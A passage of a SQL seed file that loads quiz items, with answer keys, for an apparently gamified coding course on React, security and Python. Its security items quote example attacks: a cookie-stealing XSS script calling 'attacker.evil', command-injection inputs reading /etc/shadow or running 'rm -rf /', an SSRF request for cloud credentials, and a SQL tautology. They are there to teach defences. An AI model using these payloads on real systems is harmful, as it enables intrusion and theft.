  '00000002-0000-4000-8000-000000000008', 'By official React convention, what two-letter prefix must all custom hooks start with to allow ESLint to enforce the Rules of Hooks?', 'React & Frontend Architecture', ARRAY['react', 'custom-hooks', 'hooks', 'architecture', 'rules-of-hooks', 'sector-3']::text[], 'Advanced', 'The Custom Hook Encapsulator', 'Complex radiation sensor polling and retry logic is duplicated across five terminal components instead of being encapsulated into a reusable hook.', 'function ________RadiationSensor(sensorId) {
  const [level, setLevel] = useState(0);
  // reusable logic
  return level;
}', ARRAY['use', 'use ', 'use-']::text[], 'Like useState, useEffect, useRef; all hooks start with this prefix.', 'The `use` prefix informs React and static analysis tools that a function adheres to the Rules of Hooks and may invoke other hooks internally.', 3
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000009', 'What React wrapper component displays a fallback spinner while child components loaded via React.lazy() are downloading over the wire?', 'React & Frontend Architecture', ARRAY['react', 'suspense', 'lazy', 'code-splitting', 'performance', 'sector-4']::text[], 'Advanced', 'The Asynchronous Code Splitter', 'The debug wing initial bundle size is 15MB, blocking initial paint until dynamically imported components are partitioned.', '<________ fallback={<TerminalLoader />}>
  <HeavyDiagnosticModule />
</________>', ARRAY['suspense', '<suspense>', 'react.suspense', '<suspense></suspense>']::text[], 'Keeps the user in "suspense" until the chunk resolves.', '`<Suspense>` catches loading promises thrown by React.lazy dynamic imports and renders a fallback placeholder until the asset arrives.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000010', 'In modern state stores like Zustand or Redux, what architecture guarantees that state updates flow in one predictable direction from action to store to UI?', 'React & Frontend Architecture', ARRAY['react', 'zustand', 'redux', 'state-management', 'flux', 'sector-4']::text[], 'Advanced', 'The Unidirectional State Flow', 'Debug console state is scattered across mutative global variables, leading to unpredictable synchronization glitches and race states.', '// State -> UI -> Action / Dispatch -> Reducer / Set -> State
// WHAT IS THIS DATA FLOW PATTERN CALLED?', ARRAY['unidirectional data flow', 'unidirectional', 'one-way data flow', 'one way data flow', 'flux']::text[], 'Data flowing in a single, un-reversed direction.', 'Unidirectional data flow ensures state transitions occur through explicit actions and pure reducers/setters, guaranteeing deterministic debugging.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000011', 'What feature introduced in React 18 automatically groups multiple state updates together within promises and timeouts to optimize render passes?', 'React & Frontend Architecture', ARRAY['react', 'react-18', 'automatic-batching', 'batching', 'performance', 'sector-4']::text[], 'Advanced', 'The Concurrent Batching Synchronizer', 'In React 18, updating three state setters sequentially inside a fetch promise used to trigger three separate renders, but now batches them into one.', 'fetch("/api/status").then(() => {
  setSanity(85);
  setAlarm(true);
  setZone(4);
  // React 18 groups these into 1 single render pass. What is this feature?
});', ARRAY['automatic batching', 'batching', 'auto batching', 'state batching']::text[], 'Grouping updates together "automatically in batches".', 'React 18 automatic batching queues state changes across all asynchronous contexts (promises, timeouts, native events) into a single optimized re-render.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000012', 'Which React 18 hook allows you to mark state updates as non-urgent transitions so urgent user keystrokes remain fluid and responsive?', 'React & Frontend Architecture', ARRAY['react', 'useTransition', 'concurrent-mode', 'performance', 'sector-5']::text[], 'Advanced', 'The Non-Blocking Transition Core', 'Typing into the nexus search console causes the heavy 3D scene to stutter because the input render and heavy filter share the same high priority.', 'const [isPending, ________] = useTransition();
startTransition(() => {
  setHeavyGraphFilter(query); // Marked as non-blocking transition
});', ARRAY['starttransition', 'start_transition', 'start transition']::text[], 'The function returned by useTransition that "starts" the transition.', 'useTransition yields control back to high-priority browser events (like typing or clicks) by marking expensive state updates as interruptible transitions.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000013', 'What dangerous React prop allows raw HTML to be inserted directly into an element, requiring strict sanitization with libraries like DOMPurify?', 'React & Frontend Architecture', ARRAY['react', 'dangerouslySetInnerHTML', 'xss', 'security', 'sanitization', 'sector-5']::text[], 'Advanced', 'The Dangerous HTML Entity Escape', 'Corrupted facility telemetry strings contain embedded attacker scripts. Directly rendering them into the DOM enables Cross-Site Scripting (XSS).', '<div ________={{ __html: sanitize(untrustedLogString) }} />', ARRAY['dangerouslysetinnerhtml', 'dangerouslySetInnerHTML']::text[], 'It warns you right in its camelCase name that setting inner HTML is "dangerous".', 'dangerouslySetInnerHTML bypasses React''s built-in string escaping; raw unsanitized HTML passed to it exposes clients to full DOM XSS attacks.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000014', 'What specific React error occurs when the pre-rendered server HTML markup does not match the initial virtual DOM tree rendered on client boot?', 'React & Frontend Architecture', ARRAY['react', 'ssr', 'hydration', 'nextjs', 'isomorphic', 'sector-5']::text[], 'Expert', 'The Hydration Invariant Fracture', 'In the Server-Side Rendered (SSR) singularity terminal, server-rendered HTML rendered a timestamp that mismatched client clock output on boot.', 'Error: Text content did not match. Server: "04:12:00" Client: "04:12:01"
// WHAT TYPE OF SSR ERROR HAS OCCURRED?', ARRAY['hydration mismatch', 'hydration error', 'hydration', 'mismatch', 'hydration failed']::text[], 'The dry server markup failed to "hydrate" cleanly with client state.', 'Hydration mismatches occur when client initial render outputs diverge from the server HTML, forcing React to discard or reconstruct subtrees.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000001', 'Which modern standard cryptographic hash function in the SHA-2 family produces a secure 256-bit fixed-length output string?', 'Cybersecurity & Cryptography', ARRAY['security', 'cryptography', 'hashing', 'sha-256', 'integrity', 'sector-1']::text[], 'Easy', 'The Cryptographic Collision Shard', 'The laboratory archive verified firmware checksums using MD5, allowing forged payloads with identical hash digests to pass integrity checks.', 'const hash = crypto.createHash("______").update(payload).digest("hex");', ARRAY['sha256', 'sha-256', 'sha 256', 'SHA-256', 'SHA256']::text[], 'Secure Hash Algorithm with a 256-bit digest length.', 'SHA-256 is a collision-resistant cryptographic hash function standard used for digital signatures, password derivation, and integrity proofs.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000002', 'What unique random cryptographic string must be appended to a password before hashing to defeat precomputed Rainbow Table attacks?', 'Cybersecurity & Cryptography', ARRAY['security', 'salting', 'passwords', 'rainbow-tables', 'pbkdf2', 'sector-1']::text[], 'Easy', 'The Precomputed Rainbow Defense', 'Operator passwords in the laboratory database were hashed without entropy, allowing precomputed lookup tables to crack credentials instantly.', 'const ______ = crypto.randomBytes(16).toString("hex");
const hash = pbkdf2Sync(password, ______, 100000, 64, "sha512");', ARRAY['salt', 'a salt', 'salting']::text[], 'A kitchen seasoning you sprinkle on food to make it unique.', 'A cryptographic salt ensures identical passwords produce completely distinct hash digests, rendering precomputed rainbow tables useless.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000003', 'What database defense uses placeholders ($1 or ?) to ensure SQL drivers treat user input strictly as literal values rather than executable code?', 'Cybersecurity & Cryptography', ARRAY['security', 'sql-injection', 'sqli', 'parameterized-queries', 'owasp', 'sector-1']::text[], 'Intermediate', 'The Injected Tautology Gate', 'Sector 1 exit security accepted the input '' OR ''1''=''1, concatenating raw user input into an un-escaped SQL authentication query.', '// INSECURE: db.query(`SELECT * FROM users WHERE user = "${input}"`);
// SECURE: db.query("SELECT * FROM users WHERE user = $1", [input]);
// WHAT IS THIS QUERY TECHNIQUE CALLED?', ARRAY['parameterized query', 'parameterized queries', 'prepared statement', 'prepared statements', 'parameterization']::text[], 'Queries where values are passed as separate parameters rather than string concatenation.', 'Parameterized queries / prepared statements precompile SQL statements, guaranteeing malicious syntax in parameters cannot alter execution trees.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000004', 'What OWASP Top 10 vulnerability occurs when malicious client scripts are injected and executed inside an unsuspecting user''s browser session?', 'Cybersecurity & Cryptography', ARRAY['security', 'xss', 'web-security', 'owasp', 'sanitization', 'sector-2']::text[], 'Intermediate', 'The Reflected Script Vector', 'The server rack diagnostic log prints URL query parameters directly into the browser DOM, allowing attackers to execute arbitrary JavaScript.', '// URL: /monitor?error=<script>fetch("https://attacker.evil/steal?c=" + document.cookie)</script>
// WHAT TYPE OF ATTACK IS THIS?', ARRAY['xss', 'cross-site scripting', 'cross site scripting', 'reflected xss']::text[], 'Abbreviated with an "X" to avoid confusion with Cascading Style Sheets.', 'Cross-Site Scripting (XSS) occurs when applications render unvalidated input into the DOM, allowing attackers to hijack sessions and steal tokens.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000005', 'What unpredictable cryptographic token is embedded into HTML forms and validated by backends to defend against CSRF attacks?', 'Cybersecurity & Cryptography', ARRAY['security', 'csrf', 'tokens', 'cookies', 'web-security', 'sector-2']::text[], 'Intermediate', 'The Forged Request Transceiver', 'A malicious email in the network router tricked an authenticated admin''s browser into executing an unauthorized state-changing transfer.', '<form action="/admin/eject-core" method="POST">
  <input type="hidden" name="__________" value="d7a4f912e8c64b" />
  <button type="submit">Eject</button>
</form>', ARRAY['csrf token', 'anti-csrf token', 'anti csrf token', 'csrf-token', 'csrf']::text[], 'A secret token specifically designed to block Cross-Site Request Forgery.', 'Anti-CSRF synchronizer tokens verify that state-modifying requests originate from the application''s own trusted forms rather than third-party sites.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000006', 'What ubiquitous JSON-based authentication token format comprises three Base64URL-encoded segments: Header, Payload, and Signature?', 'Cybersecurity & Cryptography', ARRAY['security', 'jwt', 'tokens', 'authentication', 'crypto', 'sector-2']::text[], 'Intermediate', 'The Unsigned Algorithm None', 'Sector 2 blast door accepted an authentication token whose JOSE header specified algorithm "none", bypassing signature verification.', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozG429...
// WHAT COMPACT URL-SAFE TOKEN FORMAT IS THIS?', ARRAY['jwt', 'json web token', 'json web tokens']::text[], 'Often pronounced like the English word "jot".', 'JSON Web Tokens (JWT) store signed claims. Failing to reject `alg: "none"` allows attackers to forge administrative payloads without valid signatures.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000007', 'What cryptographic protocol (the successor to SSL) provides end-to-end encrypted transport, authentication, and integrity over TCP port 443?', 'Cybersecurity & Cryptography', ARRAY['security', 'tls', 'https', 'cryptography', 'certificates', 'sector-3']::text[], 'Advanced', 'The Asymmetric Handshake Shield', 'Coolant telemetry transmission was intercepted because the connection lacked mutual asymmetric cryptographic verification.', '// Handshake: ClientHello -> ServerHello -> Certificate -> KeyExchange -> Finished
// WHAT TRANSPORT SECURITY PROTOCOL IS THIS?', ARRAY['tls', 'transport layer security', 'tls 1.3', 'tls/ssl', 'tls 1.2']::text[], 'Three letters, powers HTTPS in every modern web browser.', 'Transport Layer Security (TLS) encrypts network communications and verifies server identity via X.509 digital certificates.', 3
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000008', 'What compiler defense places a random secret integer on the stack before the return address to detect and terminate buffer overflow attacks?', 'Cybersecurity & Cryptography', ARRAY['security', 'buffer-overflow', 'canary', 'memory-safety', 'c-cpp', 'sector-3']::text[], 'Advanced', 'The Stack Canary Canary Warning', 'A legacy C firmware daemon in the reactor core used strcpy() on unbounded network input, overwriting instruction pointer registers.', '// Function Stack: [Local Variables] -> [_______] -> [Saved Frame Pointer] -> [Return Address]
// If overwritten, __stack_chk_fail terminates execution.', ARRAY['stack canary', 'canary', 'stack canaries', 'canary value']::text[], 'Named after the bird miners took into coal mines to detect toxic gases.', 'Stack canaries detect memory corruption by checking whether a secret value immediately preceding the saved return address has been overwritten.', 3
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000009', 'What foundational security principle states that every program and user must operate using only the minimal set of privileges necessary to perform its job?', 'Cybersecurity & Cryptography', ARRAY['security', 'least-privilege', 'iam', 'zero-trust', 'access-control', 'sector-4']::text[], 'Advanced', 'The Least Privilege Principle', 'A maintenance script running in the debug wing was granted full root AWS IAM privileges, allowing an anomaly exploit to delete the backup vaults.', '// SECURITY AUDIT: Restrict service account from AdministratorAccess to s3:GetObject only.
// WHAT PRINCIPLE DOES THIS ENFORCE?', ARRAY['principle of least privilege', 'least privilege', 'polp', 'least privilege principle']::text[], 'Granting the "least" amount of "privilege" possible.', 'The Principle of Least Privilege limits damage from compromised components by ensuring entities only hold permissions strictly essential to their role.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000010', 'What function or comparison technique must be used when comparing cryptographic hashes to ensure comparison time is independent of input characters?', 'Cybersecurity & Cryptography', ARRAY['security', 'timing-attacks', 'side-channel', 'cryptography', 'hmac', 'sector-4']::text[], 'Advanced', 'The Microsecond Leak Vector', 'An authentication endpoint verified HMAC signatures using standard == string comparison, leaking secret length and prefix via microsecond timing differences.', '// VULNERABLE: return userHash === expectedHash; // Early return on first mismatch!
// SECURE: return crypto.________________(userBuffer, expectedBuffer);', ARRAY['timingsafeequal', 'constant time comparison', 'constant-time comparison', 'crypto.timingsafeequal']::text[], 'A comparison that runs in "constant time" or is "timing safe".', 'Constant-time comparisons prevent side-channel timing attacks by checking every byte regardless of whether an early byte failed.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000011', 'What vulnerability category allows untrusted user input to break out of command strings and execute arbitrary operating system instructions?', 'Cybersecurity & Cryptography', ARRAY['security', 'command-injection', 'rce', 'owasp', 'subprocess', 'sector-4']::text[], 'Advanced', 'The Arbitrary Shell Execution', 'Containment gate diagnostics ran child_process.exec("ping " + host), allowing attackers to append "; rm -rf /" to execute arbitrary OS commands.', '// Input: "127.0.0.1 && cat /etc/shadow"
// Command: exec("traceroute " + input);
// WHAT VULNERABILITY IS THIS?', ARRAY['command injection', 'os command injection', 'shell injection']::text[], 'Injecting shell commands into the operating system.', 'Command Injection occurs when input containing shell metacharacters (;, &&, |) is evaluated by system shells rather than isolated argument arrays.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000012', 'What attack class tricks a server into issuing unauthorized HTTP requests to internal network services and cloud metadata APIs?', 'Cybersecurity & Cryptography', ARRAY['security', 'ssrf', 'cloud-security', 'metadata', 'owasp', 'sector-5']::text[], 'Advanced', 'The Metadata Impersonation Barrier', 'The nexus webhook system fetches user-provided URLs. An attacker entered http://169.254.169.254 to exfiltrate temporary cloud instance credentials.', '// Attacker triggers: POST /webhook/test { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
// WHAT OWASP VULNERABILITY IS THIS?', ARRAY['ssrf', 'server-side request forgery', 'server side request forgery']::text[], 'Server-Side Request Forgery.', 'SSRF allows attackers to abuse server network trust to query internal ports, loopback interfaces, and cloud metadata endpoints.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000013', 'What cryptographic property ensures that the compromise of a long-term private key does NOT compromise past session keys generated with ephemeral Diffie-Hellman?', 'Cybersecurity & Cryptography', ARRAY['security', 'diffie-hellman', 'pfs', 'forward-secrecy', 'cryptography', 'sector-5']::text[], 'Advanced', 'The Ephemeral Key Secrecy', 'An adversary recorded past encrypted traffic sessions. If the facility master private key is stolen, all past historical sessions could be decrypted.', '// DHE / ECDHE generates unique temporary session keys per handshake.
// Past captured sessions remain un-decryptable.
// WHAT PROPERTY IS THIS?', ARRAY['perfect forward secrecy', 'forward secrecy', 'pfs']::text[], 'Guarantees secrecy going "forward" in time.', 'Perfect Forward Secrecy (PFS) ensures each session uses unique ephemeral key pairs that are discarded after the session terminates.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000003-0000-4000-8000-000000000014', 'What cryptographic proof protocol enables a prover to mathematically convince a verifier that a statement is true with zero disclosure of underlying private data?', 'Cybersecurity & Cryptography', ARRAY['security', 'zero-knowledge', 'zkp', 'zk-snark', 'cryptography', 'sector-5']::text[], 'Expert', 'The Zero-Knowledge Extraction Gate', 'The final gateway demands proof that you possess the master containment passphrase without ever transmitting or revealing any bits of the secret.', '// Prover demonstrates knowledge of secret S where Hash(S) = H
// Verifier confirms validity without learning S.
// WHAT CRYPTOGRAPHIC PROOF CLASS IS THIS?', ARRAY['zero-knowledge proof', 'zero knowledge proof', 'zkp', 'zk-snark', 'zero knowledge']::text[], 'You prove truth while imparting "zero knowledge" of the secret.', 'Zero-Knowledge Proofs (ZKPs) allow mathematical verification of statements or authorizations without exposing the underlying confidential information.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000001', 'In Python, what single punctuation character must appear at the end of a def, if, for, or while statement line to introduce an indented suite?', 'Python & Backend Systems', ARRAY['python', 'syntax', 'backend', 'primitives', 'sector-1']::text[], 'Easy', 'The Colon Suite Delimiter', 'The laboratory environment script failed to compile due to a missing structural delimiter before an indented code block.', 'def verify_clearance(operator_id) # WHAT CHARACTER IS MISSING HERE?
    return operator_id.startswith("OP_")', ARRAY[':', ': ', 'colon', 'a colon']::text[], 'Two dots stacked vertically.', 'In Python syntax, a colon (:) is the required token at the end of header lines that open an indented block of statements.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000002', 'In Python asyncio, what keyword is used inside async def functions to pause execution until an asynchronous Task or Future resolves?', 'Python & Backend Systems', ARRAY['python', 'asyncio', 'await', 'concurrency', 'event-loop', 'sector-1']::text[], 'Easy', 'The Non-Blocking Event Yield', 'The backend web server froze because a synchronous time.sleep() blocked the entire single-threaded asyncio event loop.', 'async def fetch_telemetry():
    data = _____ async_http_client.get("/sensors") # WHAT KEYWORD SUSPENDS EXECUTION?
    return data', ARRAY['await', 'await ']::text[], 'You "await" the result of a promise or task.', 'The `await` keyword yields execution back to the asyncio event loop while waiting for asynchronous I/O operations to complete.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
